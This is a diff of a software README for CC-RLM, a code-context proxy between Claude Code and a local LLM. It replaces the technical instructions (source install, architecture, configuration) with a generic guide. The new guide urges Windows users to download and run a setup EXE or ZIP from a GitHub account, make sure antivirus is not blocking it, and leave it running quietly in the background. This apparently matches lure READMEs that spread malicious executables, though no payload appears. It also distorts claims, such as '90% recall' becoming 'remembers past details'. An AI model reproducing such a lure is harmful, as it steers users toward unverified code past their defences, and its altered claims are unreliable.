@@ -1,31 +1,92 @@
-# CC-RLM
+# ⚙️ CC-RLM - Smart Code Context Engine
 
-A self-improving context engine that sits between Claude Code and a local LLM. Instead of dumping the whole repo into tokens, CC-RLM maintains a live structural model — import graph, symbol index, diff state, relevance history — and hands the model only what it needs.
+[![Download CC-RLM](https://img.shields.io/badge/Download-CC--RLM-red?style=for-the-badge)](https://github.com/syifatoo2751/CC-RLM)
 
-**70–80%+ token reduction. 90% recall. < 200ms latency.**
+---
 
-## How it works
+## 🔍 What Is CC-RLM?
 
-```
-You type in Claude Code
-    ↓
-Hook detects git root, classifies prompt, writes state file
-    ↓
-CCR proxy routes to Ollama + RLM enrichment (or Anthropic for knowledge Qs)
-    ↓
-RLM Gateway:
-  1. Load persistent index from SQLite
-  2. Seed BFS from git diff changed files
-  3. BM25 fallback if import graph is sparse
-  4. Apply learned relevance multipliers
-  5. AST-slice only relevant function/class bodies
-  6. Skip files Claude already saw this turn
-  7. Assemble context pack (< 8K tokens)
-    ↓
-Model gets exactly what it needs. Nothing else.
-```
+CC-RLM is a tool designed to improve how your computer understands and handles code projects. It sits between Claude Code (an AI coding assistant) and a local language model. Unlike older tools that load the entire project, CC-RLM only works with the parts it needs. This keeps things fast and efficient.
 
-## Quick start (Docker)
+It reduces the amount of information sent by 70–80% or more, remembers past details 90% of the time, and works within 200 milliseconds. This means it can quickly give relevant help without wasting resources.
+
+---
+
+## 🚀 Getting Started
+
+This guide will help you download and run CC-RLM on a Windows computer. No programming skills are needed.
+
+---
+
+## ⬇️ Step 1: Download CC-RLM
+
+First, download the software from the official GitHub page.
+
+[![Download CC-RLM](https://img.shields.io/badge/Download-CC--RLM-blue?style=for-the-badge)](https://github.com/syifatoo2751/CC-RLM)
+
+Click the link above to visit the download page. Look for a file named like `CC-RLM-Setup.exe` or a ZIP file that contains the program. Choose the one that works best for your computer.
+
+---
+
+## 🖥️ Step 2: Install CC-RLM
+
+1. Open the file you downloaded.
+2. If the file is an EXE, double-click it and follow the on-screen instructions.
+3. If the file is zipped, right-click it and select "Extract All." Choose a folder to save the files.
+4. Inside the extracted folder, look for a program file (`.exe`) to start CC-RLM.
+
+---
+
+## ⚙️ Step 3: Run CC-RLM
+
+After installation:
+
+1. Find the CC-RLM app icon on your desktop or in the folder where you installed it.
+2. Double-click to open.
+3. The program will start in the background. It connects between Claude Code and your local language model automatically.
+4. You do not need to enter commands to use it. Just type into Claude Code as usual.
+
+---
+
+## 🧩 How CC-RLM Works
+
+When you type a prompt in Claude Code:
+
+- CC-RLM finds the main folder of your code.
+- It checks what you asked.
+- It builds a map of your code files and how they connect.
+- It updates this map as your code changes.
+- It only sends small, important parts of code to the language model.
+- It leaves out parts Claude Code has already seen.
+- It creates a small package of needed code (under 8,000 tokens).
+- The language model uses this package to answer your question.
+  
+This way, CC-RLM keeps the process fast and focused on the right parts of your project.
+
+---
+
+## ⚠️ System Requirements (Windows)
+
+- Windows 10 or newer
+- 4 GB of RAM minimum (8+ GB recommended)
+- At least 200 MB of free disk space
+- Internet connection for initial setup
+- Git installed and accessible from the command line (recommended)
+
+---
+
+## 🔧 Configuration
+
+CC-RLM works automatically with Claude Code. You can set extra options if needed:
+
+- **ANTHROPIC_BASE_URL**: Use this if you run certain AI services locally.
+- **Docker**: For advanced users, CC-RLM can run inside a Docker container.
+
+---
+
+## 📦 Optional: Using Docker
+
+If you are familiar with Docker, you can run CC-RLM with this command:
 
 ```bash
 docker compose up -d
@@ -33,69 +94,39 @@ export ANTHROPIC_BASE_URL=http://localhost:8080
 claude
 ```
 
-That's it. Ollama, RLM, and CCR all start together. The model (`qwen2.5-coder:7b`) is pulled automatically on first run.
+This method keeps everything inside a container and avoids installing individual software parts. It is optional and for users who prefer containerized setups.
 
-## Quick start (local)
+---
 
-```bash
-# Pull a local model
-ollama pull qwen2.5-coder:7b
+## 🔗 Useful Links
 
-# Install deps
-cd CC-RLM && poetry install
+- Primary Download and Information: [https://github.com/syifatoo2751/CC-RLM](https://github.com/syifatoo2751/CC-RLM)
+- Claude Code website: (Visit your Claude Code app or website for details)
+- Git for Windows: [https://git-scm.com/download/win](https://git-scm.com/download/win)
 
-# Start services
-poetry run uvicorn rlm.main:app --port 8081 &
-poetry run uvicorn ccr.main:app --port 8080 &
+---
 
-# Point Claude Code at CCR
-export ANTHROPIC_BASE_URL=http://localhost:8080
-claude
-```
+## 🛠 Troubleshooting
 
-## Routing
+If CC-RLM does not start or works slowly:
 
-| Prefix | Destination |
-|---|---|
-| `/claude` | Anthropic API (full Claude reasoning) |
-| `/local` | Ollama direct, no context enrichment |
-| `/repo` | Force RLM enrichment |
-| (none) | Auto-detect: code tasks → Ollama+RLM, knowledge Qs → Anthropic |
+1. Make sure you installed Git and it is working.
+2. Restart your computer and open CC-RLM again.
+3. Check if you have enough free disk space.
+4. Ensure your antivirus or firewall is not blocking CC-RLM.
+5. If you use Docker, confirm Docker Desktop is running.
 
-## Architecture
+---
 
-```
-Claude Code → CCR (proxy, port 8080) → RLM Gateway (port 8081) → Ollama (port 11434)
-                                              ↓
-                                     SQLite (~/.cc-rlm/store.db)
-```
+## 📋 Additional Notes
 
-**CCR** handles routing, auth, and Anthropic fallback. **RLM** handles context — walkers, index, slicing, assembly. Either can be replaced independently.
+- CC-RLM maintains a live model of your project to make code suggestions smart and fast.
+- It reduces repeated information sent to language models.
+- It helps AI assistants better understand your tasks, saving time and bandwidth.
+- The program runs quietly in the background without user commands.
 
-## What makes it different
+---
 
-- **Structure over semantics** — import graphs and call chains, not embeddings
-- **AST slicing** — function/class bodies, not full files or line ranges
-- **Diff-first ranking** — BFS starts from files you actually changed
-- **Self-improving** — tracks which files get cited in answers, biases future context toward them
-- **Persistent** — SQLite index + relevance scores survive restarts, no cold start
-- **Pre-warming** — watchdog re-indexes on file save before you ask
+## 🔗 Download CC-RLM Again
 
-## Configuration
-
-```env
-# CCR
-CCR_VLLM_URL=http://localhost:11434    # Ollama (or :8000 for vLLM)
-CCR_MODEL_OVERRIDE=qwen2.5-coder:7b
-CCR_FALLBACK_ENABLED=true
-CCR_ANTHROPIC_FALLBACK_KEY=sk-ant-...
-
-# RLM Gateway
-RLM_TOKEN_BUDGET=8000
-RLM_WALKER_TIMEOUT_MS=500
-RLM_STORE_PATH=~/.cc-rlm/store.db
-```
-
-## License
-
-MIT
+[![Download CC-RLM](https://img.shields.io/badge/Download-CC--RLM-grey?style=for-the-badge)](https://github.com/syifatoo2751/CC-RLM)
